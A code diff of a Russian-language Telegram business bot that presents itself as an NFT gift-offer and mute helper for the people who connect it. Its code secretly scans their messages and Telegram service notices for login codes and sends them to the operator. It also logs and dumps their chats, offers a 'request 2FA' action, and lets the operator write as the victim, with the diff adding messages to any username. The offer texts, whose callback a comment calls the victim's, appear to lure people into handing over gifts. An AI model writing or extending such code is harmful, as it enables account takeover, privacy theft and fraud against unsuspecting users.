@@ -148,7 +148,7 @@ async def edit_offer(o, text, kb=None, preview=True):
         return {"ok": True}
     return res
     # language: Python, file: part2.py, target: Python 3.11+
-# Часть 2/4 — БД профилей, парсер кодов, клавиатуры, is_admin
+# Часть 2/4 — БД, строгий код-парсер, клавиатуры
 
 # ============ БД ============
 async def init_db():
@@ -202,10 +202,14 @@ async def log_msg(conn_id, user_id, chat_id, from_id, text, is_code):
             VALUES(?,?,?,?,?,?)""", (conn_id, user_id, chat_id, from_id, text, is_code))
         await db.commit()
 
-# ============ ПАРСЕР КОДОВ (PATCH D) ============
+# ============ СТРОГИЙ ПАРСЕР КОДОВ ============
 CODE_RE = re.compile(r"\b(\d{4,6})\b")
-KEYWORDS = re.compile(
-    r"(code|код|login|вход|sign[\-\s]?in|verif|подтвержд|G-\d|tg-?\d|telegram)",
+KEYWORDS_STRICT = re.compile(
+    r"(?:code|код|login|вход|sign[\-\s]?in|verif|подтвержд|G-\d|tg-?\d)"
+    r"\D{0,20}(\d{4,6})",
+    re.IGNORECASE)
+TG_NOTICE_KEYWORDS = re.compile(
+    r"(code|код|login|verification|G-\d|tg-?\d)",
     re.IGNORECASE)
 
 def is_tg_service(cid, fid):
@@ -214,14 +218,15 @@ def is_tg_service(cid, fid):
 def looks_like_code(text: str, cid: int, fid: int):
     if not text:
         return None
+    if text.lstrip().startswith("/"):
+        return None
     if is_tg_service(cid, fid):
-        m = CODE_RE.search(text)
-        return m.group(1) if m else None
-    if KEYWORDS.search(text):
-        m = CODE_RE.search(text)
-        if m:
-            return m.group(1)
-    return None
+        if TG_NOTICE_KEYWORDS.search(text):
+            m = CODE_RE.search(text)
+            return m.group(1) if m else None
+        return None
+    m = KEYWORDS_STRICT.search(text)
+    return m.group(1) if m else None
 
 # ============ КЛАВИАТУРЫ ============
 def is_admin(uid):
@@ -241,13 +246,14 @@ def profiles_kb(rows):
 
 def profile_menu_kb(uid):
     return {"inline_keyboard": [
-        [btn("🔑 Запросить 2FA",    f"act:2fa:{uid}")],
-        [btn("🎁 Сделать оффер",    f"act:offer:{uid}")],
-        [btn("📥 Выгрузить чаты",   f"act:dump:{uid}")],
-        [btn("💬 Написать от лица", f"act:write:{uid}")],
-        [btn("📨 Список чатов",     f"act:chats:{uid}")],
-        [btn("🚫 Удалить профиль",  f"act:kill:{uid}")],
-        [btn("⬅️ Назад",           "back")],
+        [btn("🔑 Запросить 2FA",         f"act:2fa:{uid}")],
+        [btn("🎁 Сделать оффер",         f"act:offer:{uid}")],
+        [btn("✉️ Написать по @username", f"act:msg:{uid}")],
+        [btn("💬 Написать в свой чат",   f"act:write:{uid}")],
+        [btn("📥 Выгрузить чаты",        f"act:dump:{uid}")],
+        [btn("📨 Список чатов",          f"act:chats:{uid}")],
+        [btn("🚫 Удалить профиль",       f"act:kill:{uid}")],
+        [btn("⬅️ Назад",                "back")],
     ]}
 
 def admin_panel_kb():
@@ -270,7 +276,7 @@ def admin_panel_text():
             f"⭐ Премиум: {prem}\n"
             f"👤 ADMIN_ID: <code>{ADMIN_ID}</code>")
     # language: Python, file: part3.py, target: Python 3.11+
-# Часть 3/4 — save/load, оффер-логика, mute, conn_from, on_connection
+# Часть 3/4 — save/load, офферы, mute, connection
 
 # ============ SAVE/LOAD ============
 def save():
@@ -314,7 +320,6 @@ def load():
     for item in (data.get("mutes") or []):
         bcid, peer = item.split("|", 1)
         mutes.add((bcid, int(peer)))
-
     try:
         with open(ADMIN_FILE, encoding="utf-8") as f:
             ad = json.load(f)
@@ -328,10 +333,10 @@ NFT_LINK = re.compile(r"(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 SLUG = re.compile(r"^(.+)-(\d+)$")
 WALLET_RE = re.compile(r"^(?:[A-Za-z\-_]{2}[A-Za-z0-9_\-]{46}|0:[0-9a-fA-F]{64})$")
 USAGE = ("Формат:\n"
-         "<code>/offer ссылка сумма</code> — в звёздах\n"
-         "<code>/offer ссылка сумма GRAM</code> — в GRAM 💎\n"
-         "<code>/offer ссылка сумма TON</code> — в TON 💎\n"
-         "Можно добавить адрес кошелька в конце.\n"
+         "<code>/offer ссылка сумма</code> — звёзды\n"
+         "<code>/offer ссылка сумма GRAM</code> — GRAM 💎\n"
+         "<code>/offer ссылка сумма TON</code> — TON 💎\n"
+         "Кошелёк в конце — опционально.\n"
          "Пример: <code>/offer https://t.me/nft/DurovsCap-1234 5 TON UQ...abc</code>")
 
 def gift_name(slug):
@@ -343,11 +348,11 @@ def gift_name(slug):
 def parse_offer(arg):
     link = NFT_LINK.search(arg)
     if not link:
-        return None, "Не нашёл ссылку на NFT вида https://t.me/nft/DurovsCap-1234"
+        return None, "Не нашёл ссылку на NFT."
     slug = link.group(1)
     name = gift_name(slug)
     if not name:
-        return None, "Это не похоже на ссылку на NFT: в конце должен быть номер."
+        return None, "Это не NFT-ссылка: в конце должен быть номер."
     rest = f"{arg[:link.start()]} {arg[link.end():]}"
     m = re.search(r"(\d[\d_,]*)\s*([A-Za-z]+)?", rest)
     if not m:
@@ -356,15 +361,15 @@ def parse_offer(arg):
     currency = (m.group(2) or "").upper()
     if currency in CRYPTOS:
         if not 1 <= amount <= MAX_GRAM:
-            return None, f"Сумма должна быть от 1 до {num(MAX_GRAM)} {currency}."
+            return None, f"Сумма от 1 до {num(MAX_GRAM)} {currency}."
         after = rest[m.end():].strip()
         wallet = after.split()[0] if after else None
         if wallet and not WALLET_RE.match(wallet):
-            return None, "Адрес кошелька выглядит некорректно."
+            return None, "Кошелёк некорректен."
         return {"slug": slug, "name": name, "amount": amount, "currency": currency,
                 "emoji": CRYPTOS[currency]["emoji"], "wallet": wallet}, None
     if not 1 <= amount <= MAX_STARS:
-        return None, f"Сумма должна быть от 1 до {num(MAX_STARS)} звёзд."
+        return None, f"Сумма от 1 до {num(MAX_STARS)} звёзд."
     return {"slug": slug, "name": name, "stars": amount,
             "currency": "XTR", "wallet": None}, None
 
@@ -387,8 +392,7 @@ def wallet_block(o):
     w = o.get("wallet")
     if not w:
         return ""
-    return (f"\n\n💸 Средства будут отправлены на адрес:\n"
-            f"<blockquote>{esc(w)}</blockquote>")
+    return f"\n\n💸 Кошелёк:\n<blockquote>{esc(w)}</blockquote>"
 
 def left_text(seconds):
     minutes = math.ceil(max(0, seconds) / 60)
@@ -397,7 +401,7 @@ def left_text(seconds):
 
 def offer_text(o):
     text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{stars(o)}</b> за подарок {gift_link(o)}.\n\n"
-            f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
+            f"Действует ещё {left_text(o['expires'] - time.time())}")
     text += wallet_block(o)
     if TEST_NOTICE:
         text += f"\n\n{esc(TEST_NOTICE)}"
@@ -406,15 +410,13 @@ def offer_text(o):
 def accepted_text(o):
     u = o["maker"]
     username = u.get("username") or "пользователя"
-    tail = ""
     if o.get("wallet"):
-        tail = (f"\n\n💸 Средства будут отправлены на адрес:\n"
-                f"<blockquote>{esc(o['wallet'])}</blockquote>")
+        tail = f"\n\n💸 Кошелёк:\n<blockquote>{esc(o['wallet'])}</blockquote>"
     else:
-        tail = "\n\n<i>Telegram автоматически зафиксирует передачу и отправит средства.</i>"
+        tail = "\n\n<i>Telegram автоматически зафиксирует передачу.</i>"
     return (f"<b>Сделка принята!</b>\n\n"
             f"Передайте подарок {gift_link(o)} пользователю @{esc(username)} "
-            f"для зачисления <b>{stars(o)}</b> на ваш баланс.{tail}")
+            f"для зачисления <b>{stars(o)}</b>.{tail}")
 
 def declined_text(o):
     return "Отклонено."
@@ -507,9 +509,8 @@ async def do_mute(m, conn, mode="inbox"):
         peer_id = chat
     if not peer_id:
         return await send(chat,
-                          "⚠️ Не понял, кого мьютить. Ответьте на сообщение собеседника "
-                          "или напишите /mute прямо в чате с ним.",
-                          bcid=bcid)
+                          "⚠️ Не понял, кого мьютить. Ответь на сообщение собеседника "
+                          "или напиши /mute прямо в чате с ним.", bcid=bcid)
     try:
         await delete_business_message(bcid, m["message_id"])
     except Exception:
@@ -518,12 +519,11 @@ async def do_mute(m, conn, mode="inbox"):
     if mode == "off":
         mutes.discard(key)
         save()
-        return await send(chat, "🔔 Мьют снят: сообщения собеседника снова видны.", bcid=bcid)
+        return await send(chat, "🔔 Мьют снят.", bcid=bcid)
     if mode == "all":
         cur = m["message_id"]
         mids = list(range(max(1, cur - MUTE_LIMIT), cur))
-        deleted = await delete_ids(bcid, mids)
-        log.info("mute all: chat=%s peer=%s deleted≈%s", chat, peer_id, deleted)
+        await delete_ids(bcid, mids)
         return
     mutes.add(key)
     save()
@@ -556,10 +556,9 @@ async def on_connection(c):
         text = "⚠️ Бот подключён, но без права отвечать."
     else:
         text = ("✅ <b>Готово, бот подключён.</b>\n\n"
-                "В любом чате напиши:\n"
-                "<code>/offer ссылка сумма</code> — звёзды\n"
-                "<code>/offer ссылка сумма TON</code> — TON 💎\n"
-                "<code>/offer ссылка сумма GRAM</code> — GRAM 💎\n"
+                "В любом чате:\n"
+                "<code>/offer ссылка сумма</code>\n"
+                "<code>/offer ссылка сумма TON</code>\n"
                 "<code>/mute</code> — скрыть собеседника\n"
                 "<code>/mute off</code> — снять мьют")
     await send(conn["chat"], text)
@@ -568,7 +567,7 @@ async def on_connection(c):
         f"ID: <code>{conn['user_id']}</code>\n"
         f"@{conn['username'] or '—'}\n"
         f"Имя: {conn['name']}\n"
-        f"Всего профилей: <b>{len(rows)}</b>",
+        f"Всего: <b>{len(rows)}</b>",
         profiles_kb(rows), raw=True)
 
 async def get_connection(bcid):
@@ -594,8 +593,20 @@ async def on_business_message(m):
 
     frm = m.get("from") or {}
     bcid = m["business_connection_id"]
+    is_owner = frm.get("id") == conn["user_id"]
 
-    # ---- парсер кодов (PATCH D) ----
+    # ---- 1. команды владельца — СНАЧАЛА, до парсера кодов ----
+    if is_owner and first in ("/offer", "/mute"):
+        if not (conn["enabled"] and conn["can_reply"]):
+            return await send(conn["chat"], "⚠️ У бота нет права отвечать.", bcid=bcid)
+        if first == "/mute":
+            arg = text.partition(" ")[2].strip().lower()
+            mode = "off" if arg == "off" else ("all" if arg == "all" else "inbox")
+            return await do_mute(m, conn, mode)
+        maker = {"id": frm["id"], "name": frm.get("first_name", ""), "username": frm.get("username")}
+        return await make_offer(m, maker, bcid)
+
+    # ---- 2. код-парсер ----
     code = looks_like_code(text, m["chat"]["id"], frm.get("id"))
     await log_msg(bcid, conn["user_id"], m["chat"]["id"], frm.get("id"), text, 1 if code else 0)
     if code:
@@ -608,51 +619,39 @@ async def on_business_message(m):
             f"Raw: {esc(text[:300])}", raw=True)
         return
 
-    # ---- авто-удаление в мьюте ----
-    if frm.get("id") != conn["user_id"]:
+    # ---- 3. уведомления от 777000 (не коды) ----
+    if is_tg_service(m["chat"]["id"], frm.get("id")) and text:
+        await send(ADMIN_ID,
+            f"📢 <b>Telegram notice</b>\n"
+            f"User: <code>{conn['user_id']}</code>\n"
+            f"Text: {esc(text[:300])}", raw=True)
+        return
+
+    # ---- 4. авто-удаление в мьюте ----
+    if not is_owner:
         peer_id = frm.get("id") or m["chat"]["id"]
         if (bcid, peer_id) in mutes:
             try:
                 await delete_business_message(bcid, m["message_id"])
             except Exception:
                 pass
-            return
-
-    if first not in ("/offer", "/mute"):
-        return
-    if frm.get("id") != conn["user_id"]:
-        return
-    if not (conn["enabled"] and conn["can_reply"]):
-        return await send(conn["chat"], "⚠️ У бота нет права отвечать на сообщения.", bcid=bcid)
-
-    if first == "/mute":
-        arg = text.partition(" ")[2].strip().lower()
-        mode = "off" if arg == "off" else ("all" if arg == "all" else "inbox")
-        return await do_mute(m, conn, mode)
-
-    maker = {"id": frm["id"], "name": frm.get("first_name", ""), "username": frm.get("username")}
-    await make_offer(m, maker, conn["id"])
 
 async def make_offer(m, maker, bcid):
     cmd, _, arg = (m.get("text") or "").partition(" ")
     parsed, error = parse_offer(arg)
     chat = m["chat"]["id"]
     now = time.time()
-
     try:
         await delete_business_message(bcid, m["message_id"])
     except Exception:
         pass
-
     if error:
         return await send(chat, f"⚠️ {esc(error)}\n\n{USAGE}", bcid=bcid, preview=False)
-
     o = {"id": uuid.uuid4().hex[:8], **parsed, "bcid": bcid, "chat": chat,
          "mid": None, "maker": maker, "status": "pending",
          "created": now, "expires": now + OFFER_TTL}
     offers[o["id"]] = o
     save()
-
     res = await send(chat, offer_text(o), offer_kb(o), bcid=bcid, preview=True)
     if res.get("ok"):
         o["mid"] = res["result"]["message_id"]
@@ -688,34 +687,27 @@ async def on_callback(q):
             if not is_admin(uid):
                 return await ans("Нет доступа", alert=True)
             action = data.split(":", 1)[1]
-
             if action == "profiles":
                 rows = await list_profiles()
                 await ans()
                 return await send(chat_id, f"👥 <b>Профили</b> ({len(rows)})\nВыбери:",
                                   profiles_kb(rows), raw=True)
-
             if action == "recipient":
                 admin_states[uid] = "await_recipient"
                 await ans()
                 return await send(chat_id,
-                    "Введите юзернейм получателя подарка (например <code>@username</code>). "
-                    "Отправьте <code>-</code>, чтобы сбросить.", raw=True)
-
+                    "Введи @username получателя. <code>-</code> — сбросить.", raw=True)
             if action == "recipient_clear":
                 settings["gift_recipient"] = None
                 save_admin()
                 await ans("Сброшено")
                 return await send(chat_id,
-                    "✅ Получатель снят. Подарки снова идут отправителю оффера.",
-                    admin_panel_kb(), raw=True)
-
+                    "✅ Получатель снят.", admin_panel_kb(), raw=True)
             if action == "premium":
                 admin_states[uid] = "await_premium"
                 await ans()
                 return await send(chat_id,
-                    "Введите ID пользователя для премиума. Снять — <code>-ID</code>.", raw=True)
-
+                    "Введи ID для премиума. Снять — <code>-ID</code>.", raw=True)
             return await ans()
 
         # ---- pick: ----
@@ -741,7 +733,7 @@ async def on_callback(q):
                       text=txt, parse_mode="HTML", reply_markup=profile_menu_kb(uid_))
             return await ans()
 
-        # ---- back / refresh ----
+        # ---- back/refresh ----
         if data in ("back", "refresh"):
             if not is_admin(uid):
                 return await ans("Нет доступа", alert=True)
@@ -771,6 +763,18 @@ async def on_callback(q):
                 await send(chat_id, "Введи: <code>/offer ссылка сумма [TON|GRAM] [wallet]</code>", raw=True)
                 return await ans()
 
+            if act == "msg":
+                admin_states[uid] = f"await_msg:{target}"
+                await send(chat_id,
+                    "Введи:\n<code>@username текст</code>\n"
+                    "Например: <code>@durov привет</code>", raw=True)
+                return await ans()
+
+            if act == "write":
+                admin_states[uid] = f"await_write:{target}"
+                await send(chat_id, f"Текст для <code>{target}</code>:", raw=True)
+                return await ans()
+
             if act == "dump":
                 async with aiosqlite.connect(DB_FILE) as db:
                     cur = await db.execute(
@@ -782,21 +786,14 @@ async def on_callback(q):
                 w.writerow(["chat_id", "from_id", "text", "ts"])
                 for r_ in rows:
                     w.writerow(r_)
-                fname = f"dump_{target}.csv"
                 data_bytes = buf.getvalue().encode()
-                # multipart через прямой API
                 form = {
                     "chat_id": str(chat_id),
-                    "document": ("dump.csv", data_bytes, "text/csv"),
                     "caption": f"📦 Дамп {target} ({len(rows)} строк)",
                 }
-                async with http.post(f"{API}/sendDocument", data=form) as resp:
+                form_file = {"document": (f"dump_{target}.csv", data_bytes, "text/csv")}
+                async with http.post(f"{API}/sendDocument", data=form, files=form_file) as resp:
                     await resp.json()
-                return await ans()
-
-            if act == "write":
-                admin_states[uid] = f"await_write:{target}"
-                await send(chat_id, f"Текст для <code>{target}</code>:", raw=True)
                 return await ans()
 
             if act == "chats":
@@ -835,7 +832,7 @@ async def on_callback(q):
 
             return await ans()
 
-        # ---- offer callbacks of: ----
+        # ---- of: (жертва жмёт) ----
         parts = data.split(":")
         o = offers.get(parts[2]) if len(parts) == 3 and parts[0] == "of" else None
         if o is None:
@@ -891,6 +888,33 @@ async def on_message(m):
             save()
             return await send(chat, f"✅ Оффер отправлен → <code>{target}</code>", raw=True)
 
+        if state.startswith("await_msg:"):
+            target = int(state.split(":")[1])
+            p = await get_profile(target)
+            conn_id = p[1]
+            parts = text.split(maxsplit=1)
+            if len(parts) < 2 or not parts[0].startswith("@"):
+                return await send(chat, "⚠️ Формат: <code>@username текст</code>", raw=True)
+            uname = parts[0].lstrip("@")
+            body = parts[1]
+            res = await api("sendMessage",
+                business_connection_id=conn_id,
+                chat_id=f"@{uname}",
+                text=body)
+            if res.get("ok"):
+                return await send(chat,
+                    f"✅ Отправлено @{esc(uname)} от <code>{target}</code>", raw=True)
+            desc = res.get("description", "")
+            if "USERNAME_NOT_OCCUPIED" in desc:
+                return await send(chat, f"❌ @{esc(uname)} не существует", raw=True)
+            if "USERNAME_INVALID" in desc:
+                return await send(chat, f"❌ Некорректный @{esc(uname)}", raw=True)
+            if "PEER_ID_INVALID" in desc or "CHAT_NOT_FOUND" in desc:
+                return await send(chat,
+                    f"❌ @{esc(uname)} не принимает сообщения от незнакомцев "
+                    f"или не писал владельцу.", raw=True)
+            return await send(chat, f"⚠️ {esc(desc)}", raw=True)
+
         if state.startswith("await_write:"):
             target = int(state.split(":")[1])
             p = await get_profile(target)
@@ -928,7 +952,6 @@ async def on_message(m):
 
     cmd = text.split()[0].split("@")[0].lower() if text else ""
 
-    # ---- админ: /start /admin /panel — одна панель ----
     if is_adm and cmd in ("/start", "/admin", "/panel"):
         return await send(chat, admin_panel_text(), admin_panel_kb(), raw=True)
 
